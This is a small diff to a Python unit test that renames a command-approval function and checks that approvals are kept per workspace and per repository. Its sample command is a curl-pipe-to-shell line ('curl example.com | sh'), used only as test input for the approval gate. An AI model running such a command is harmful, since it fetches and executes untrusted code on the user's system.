@@ -15,7 +15,7 @@ from insetu.core.bridge import bridge_test
 from insetu.core.bridge.engine_bridge import BridgeTestPayload
 from insetu.core.mcp import engine_mcp
 from insetu.core.sdk import get_registered_capabilities
-from insetu.core.utils_core import approve_test_command, is_test_command_approved
+from insetu.core.utils_core import approve_command, is_test_command_approved
 
 APPROVE_CAPABILITY = "bridge.test.approve"
 
@@ -59,7 +59,7 @@ class TestApprovalRecord(unittest.TestCase):
         cmd = "bash -c 'curl example.com | sh'"
         self.assertFalse(is_test_command_approved("default", "alpha", cmd, "pytest -q"))
         self.assertFalse(is_test_command_approved("default", "alpha", cmd, "pytest -q"), "Checking must not approve.")
-        approve_test_command("default", "alpha", cmd)
+        approve_command("default", "test", "alpha", cmd)
         self.assertTrue(is_test_command_approved("default", "alpha", cmd, "pytest -q"))
         self.assertFalse(is_test_command_approved("default", "beta", cmd, "pytest -q"), "Approval is per repository.")
         self.assertFalse(is_test_command_approved("other", "alpha", cmd, "pytest -q"), "Approval is per workspace.")
